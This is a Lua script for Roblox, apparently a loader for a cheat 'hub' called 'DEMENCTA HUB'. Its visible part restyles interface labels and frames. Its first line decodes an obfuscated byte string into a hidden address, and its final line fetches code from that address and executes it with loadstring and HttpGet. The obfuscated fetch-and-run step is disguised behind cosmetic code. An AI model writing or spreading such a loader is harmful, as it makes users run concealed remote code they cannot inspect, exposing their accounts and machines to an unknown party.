
--[[ STAGE 2: VISUAL CORE ]]
local YK1UtBrDcrG1SV09rD="\202\039\223\154\215\215\224\237\233\220\217\245\220\219\218\042\054\041\214\219\240\244\248\246\249\056\034\046\058\214\046\061\006\006\057\053\002\039\054\197\048\006\060\002\058\009\009\217\056\007\022\005\002\010\012\050\000\025\008\050\220\028\016\009\030\217\031\024\022\109\026\019\026\108\029\035\025\105\109\025\110\103\104\101\107\117\117\055\118\113\110\050\121\124\116\068\127\121\118\070\114\065\076\114\078\122\079\069\068\012\086\121\075\009\010\030\080\086\083\092\073"local sxUbZdImPTRU3N4gUR=36 local xzU7zdnhgOx7He3ENEA=116 local XBi9ykOBCip6Xy=1 local egTyd8QgySs2B6=1 local JYWAeDLcNwjzgSyxjwDo=24 local QQZqgZzuPZjisZtbX4Bn=true local pFbv0DGE7Rxl=bit32 and bit32.bxor if not pFbv0DGE7Rxl then pFbv0DGE7Rxl=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local FbpbfTukS4xG61={}for bS6zcamDw3tRLc7c2u=1,#YK1UtBrDcrG1SV09rD do local AM94bj7_XhSm5PeWw7U=string.byte(YK1UtBrDcrG1SV09rD,bS6zcamDw3tRLc7c2u)local n_9e_nGt_WbVP=(xzU7zdnhgOx7He3ENEA+(bS6zcamDw3tRLc7c2u*egTyd8QgySs2B6)+JYWAeDLcNwjzgSyxjwDo)%256 if XBi9ykOBCip6Xy==0 then AM94bj7_XhSm5PeWw7U=(AM94bj7_XhSm5PeWw7U-n_9e_nGt_WbVP)%256 FbpbfTukS4xG61[bS6zcamDw3tRLc7c2u]=string.char(pFbv0DGE7Rxl(AM94bj7_XhSm5PeWw7U,sxUbZdImPTRU3N4gUR))else AM94bj7_XhSm5PeWw7U=pFbv0DGE7Rxl(AM94bj7_XhSm5PeWw7U,sxUbZdImPTRU3N4gUR)FbpbfTukS4xG61[bS6zcamDw3tRLc7c2u]=string.char((AM94bj7_XhSm5PeWw7U-n_9e_nGt_WbVP)%256)end end local qlZMI0pODgIqX=table.concat(FbpbfTukS4xG61)if QQZqgZzuPZjisZtbX4Bn then qlZMI0pODgIqX=string.reverse(qlZMI0pODgIqX)end local svIn4cvawVZ9edaFrZ7pBf=qlZMI0pODgIqX
local HubName = "DEMENCTA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(svIn4cvawVZ9edaFrZ7pBf))()
